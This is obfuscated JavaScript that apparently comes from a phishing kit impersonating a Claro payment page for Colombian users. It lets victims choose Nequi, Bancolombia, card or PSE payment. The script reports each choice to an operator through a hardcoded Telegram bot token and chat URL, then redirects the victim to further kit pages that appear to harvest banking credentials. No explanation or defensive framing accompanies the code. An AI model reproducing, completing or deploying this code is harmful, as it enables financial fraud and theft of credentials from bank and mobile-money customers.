function _0x4de7() {
  const _0x22f786 = [
    "🟡\x20Bancolombia\x20(Claro)",
    "href",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "4140PCyUjm",
    "77710dOiBbs",
    "location",
    "statusText",
    "8365744hhwBiG",
    "bancolombia.png",
    "916008htgBcz",
    "pse.png",
    "FORMA_PAGO_2.png",
    "Mensaje\x20enviado\x20a\x20Telegram",
    "1221PrVxXM",
    "7YLdKUw",
    "🟣\x20PSE\x20(Claro)",
    "🟠\x20Tarjeta\x20(Claro)",
    "./points/nequi/rastrear/indexwait.html",
    "2395nlHJOb",
    "style",
    "183640xopGgn",
    "value",
    "display",
    "3gMRyMf",
    "🔵\x20Nequi\x20(Claro)",
    "getElementById",
    "./points/trico/home.html",
    "error",
    "nextStep",
    "1201406ihAcse",
    "3294981KyckJh",
    "click",
    "./tc.html",
    "NEQ.png",
    "log",
  ];
  _0x4de7 = function () {
    return _0x22f786;
  };
  return _0x4de7();
}
const _0x16b771 = _0xbac0;
(function (_0x30a48a, _0x2c090e) {
  const _0x274494 = _0xbac0,
    _0x5d07da = _0x30a48a();
  while (!![]) {
    try {
      const _0x55bb0c =
        -parseInt(_0x274494(0x98)) / 0x1 +
        (-parseInt(_0x274494(0x8e)) / 0x2) *
          (-parseInt(_0x274494(0x88)) / 0x3) +
        (parseInt(_0x274494(0x97)) / 0x4) * (parseInt(_0x274494(0xa6)) / 0x5) +
        (-parseInt(_0x274494(0x9d)) / 0x6) *
          (-parseInt(_0x274494(0xa2)) / 0x7) +
        parseInt(_0x274494(0x9b)) / 0x8 +
        parseInt(_0x274494(0x8f)) / 0x9 +
        (parseInt(_0x274494(0xa8)) / 0xa) * (-parseInt(_0x274494(0xa1)) / 0xb);
      if (_0x55bb0c === _0x2c090e) break;
      else _0x5d07da["push"](_0x5d07da["shift"]());
    } catch (_0x257342) {
      _0x5d07da["push"](_0x5d07da["shift"]());
    }
  }
})(_0x4de7, 0x85051);
async function sendToTelegram(_0xa663a2) {
  const _0x4dce6b = _0xbac0,
    _0x4fb75c =
      _0x4dce6b(0x96) + chatId + "&text=" + encodeURIComponent(_0xa663a2);
  try {
    const _0x2a642e = await fetch(_0x4fb75c);
    _0x2a642e["ok"]
      ? console[_0x4dce6b(0x93)](_0x4dce6b(0xa0))
      : console[_0x4dce6b(0x8c)](
          "Error\x20al\x20enviar\x20mensaje:",
          _0x2a642e[_0x4dce6b(0x9a)]
        );
  } catch (_0x1cf0f1) {
    console[_0x4dce6b(0x8c)]("Error\x20de\x20red:", _0x1cf0f1);
  }
}
function _0xbac0(_0xdb017d, _0x28fc58) {
  const _0x4de720 = _0x4de7();
  return (
    (_0xbac0 = function (_0xbac00c, _0x32cf05) {
      _0xbac00c = _0xbac00c - 0x86;
      let _0x4ed6d8 = _0x4de720[_0xbac00c];
      return _0x4ed6d8;
    }),
    _0xbac0(_0xdb017d, _0x28fc58)
  );
}
document["getElementById"](_0x16b771(0x8d))["addEventListener"](
  _0x16b771(0x90),
  async function () {
    const _0x3f8c4e = _0x16b771;
    document[_0x3f8c4e(0x8a)]("loader-container")[_0x3f8c4e(0xa7)][
      _0x3f8c4e(0x87)
    ] = "flex";
    const _0x49eea9 =
      document[_0x3f8c4e(0x8a)]("paymentOptions")[_0x3f8c4e(0x86)];
    let _0x3f8b5a = "";
    if (_0x49eea9 === _0x3f8c4e(0x92)) _0x3f8b5a = _0x3f8c4e(0x89);
    else {
      if (_0x49eea9 === _0x3f8c4e(0x9c)) _0x3f8b5a = _0x3f8c4e(0x94);
      else {
        if (_0x49eea9 === "FORMA_PAGO_2.png") _0x3f8b5a = _0x3f8c4e(0xa4);
        else _0x49eea9 == "pse.png" && (_0x3f8b5a = _0x3f8c4e(0xa3));
      }
    }
    _0x3f8b5a && (await sendToTelegram(_0x3f8b5a)),
      setTimeout(function () {
        const _0xbda413 = _0x3f8c4e;
        if (_0x49eea9 === _0xbda413(0x92))
          window["location"][_0xbda413(0x95)] = _0xbda413(0xa5);
        else {
          if (_0x49eea9 === _0xbda413(0x9c))
            window[_0xbda413(0x99)]["href"] = _0xbda413(0x8b);
          else {
            if (_0x49eea9 === _0xbda413(0x9f))
              window["location"][_0xbda413(0x95)] = _0xbda413(0x91);
            else
              _0x49eea9 == _0xbda413(0x9e) &&
                (window[_0xbda413(0x99)][_0xbda413(0x95)] = "./ps.html");
          }
        }
      }, 0x7d0);
  }
);
